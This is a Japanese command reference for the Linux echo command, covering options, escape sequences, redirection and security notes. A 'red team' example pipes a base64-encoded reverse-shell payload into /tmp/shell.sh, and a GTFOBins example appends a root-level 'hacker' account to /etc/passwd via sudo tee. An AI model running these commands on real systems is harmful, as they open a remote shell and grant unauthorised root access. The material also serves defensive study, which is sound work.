# Command - Linux - echo - 文字列や変数の値を表示する

## 概要

`echo` は、引数として与えられた文字列を標準出力に出力します。シェルスクリプト内でのユーザーへのメッセージ表示や、リダイレクトを用いたファイル作成、環境変数の値の確認など、多岐にわたる用途で使用されます。

(出自: ほとんどのシェルの組み込みコマンド (Built-in) として実装されている)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `printf` | 出力の書式設定が非常に柔軟。改行を自動で付けないため、移植性の高いスクリプト作成に向く。 | 複雑な書式設定 |
| `print` | Zshなど一部のシェルで提供される、echoをより高機能にしたコマンド。 | シェル固有の高度な出力 |
| `echo` | シンプルで高速。ほとんどの状況で直感的に使用できる。 | **簡易的な表示・ファイル出力** |

## よく連携されるコマンド

### シナリオ例: 設定ファイルの即時生成 (運用・構築視点)

* **目的**: エディタを開かずに、一行の設定をファイルに追加する。
* **連携コマンド**: リダイレクト (`>`, `>>`)
* **解説**: `>` は上書き、`>>` は追記です。
* **コマンド例**:
    ```bash
    # リポジトリ設定を新しいファイルに書き込む
    echo "deb [http://archive.ubuntu.com/ubuntu](http://archive.ubuntu.com/ubuntu) focal main" | sudo tee /etc/apt/sources.list.d/extra.list
    ```

## オプション説明

※シェルの実装（Bash, Zsh, Dash等）によって挙動が微妙に異なる場合があります。

| オプション | 説明 |
| :--- | :--- |
| ⭐️ `-n` | 末尾の改行を出力しない。 |
| ⭐️ `-e` | バックスラッシュによるエスケープシーケンス（`\n`, `\t` 等）を解釈する。 |
| `-E` | エスケープシーケンスを解釈しない（デフォルトの挙動）。 |

### 主要なエスケープシーケンス (`-e` 有効時)

* `\n`: 改行
* `\t`: 水平タブ
* `\xHH`: 16進数 HH で指定される ASCII 文字（バイナリデータの生成に便利）

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 環境変数の値の確認。
* **組み合わせ**: `echo $VARIABLE`
* **解説**: パス設定（`$PATH`）や現在のユーザー（`$USER`）などのシステム情報を即座に確認します。
* **例**:
    ```bash
    # 実行ファイルの検索パスを確認
    echo $PATH
    ```

### 2. ブルーチーム視点

* **タスク**: ログへのカスタムメッセージ記録。
* **組み合わせ**: `logger` との連携
* **解説**: スクリプトの実行タイミングやエラーをシステムログに記録します。
* **例**:
    ```bash
    # メンテナンス開始のメッセージを syslog に送る
    echo "Maintenance started by $(whoami)" | logger
    ```

### 3. レッドチーム視点

* **タスク**: ペイロードのデコードとファイル配置。
* **組み合わせ**: `echo -e`, `base64`
* **解説**: Base64 エンコードされたバイナリやスクリプトを `echo` で流し込み、現場で復元します。
* **例**:
    ```bash
    # Base64形式のペイロードをデコードしてファイルに保存
    echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjEK" | base64 -d > /tmp/shell.sh
    ```

## エラーメッセージとトラブルシューティング

1.  **「$記号が表示されない」**:
    * **原因**: ダブルクォート `"` 内で `$VAR` を書くと、変数が展開されてしまう。
    * **解決策**: 文字列として表示したい場合はシングルクォート `'` で囲むか、`\$` とエスケープする。

2.  **「改行コード `\n` がそのまま文字として出る」**:
    * **原因**: `-e` オプションが指定されていない。
    * **解決策**: `echo -e "line1\nline2"` とする。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **情報漏洩**: 環境変数の中にはパスワードや API キー（`$AWS_SECRET_ACCESS_KEY` 等）が含まれていることがあります。`echo` の履歴が `.bash_history` に残ると、後の調査でそれらが露出するリスクがあります。
* **データインジェクション**: `echo $USER_INPUT >> config` のようなコードがある場合、`USER_INPUT` に改行コードを含めることで、予期せぬ設定行を注入される可能性があります。

### GTFOBins における利用例

`echo` は単機能なため、それ自体で特権昇格することは稀ですが、`sudo` 権限がある場合は任意のファイルへの書き込み（上書き）が可能です。

* **機能**: `File Write`, `Sudo`
* **コマンド例**:
    ```bash
    # sudo echo を使って root 権限のファイルに書き込む (tee を使うのが一般的)
    echo "hacker:x:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
    ```

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 機密情報を環境変数に置く際は、シェルの履歴に残らないよう `HISTCONTROL=ignorespace` を活用し、コマンドの先頭にスペースを入れて実行する。
* **Detection (検知)**: 重要なシステムファイル（`/etc/shadow` 等）へのリダイレクトや `tee` を伴う `echo` の実行を監視する。

## 注意点・補足

* **ダブルクォート vs シングルクォート**:
    * `"..."`: 変数を展開する。
    * `'...'`: 文字列をそのまま（Literal）扱う。
* **パイプの挙動**: `echo` の出力は標準出力なので、パイプで `grep` や `sed` に渡してテキスト加工の起点にすることが非常に多いです。
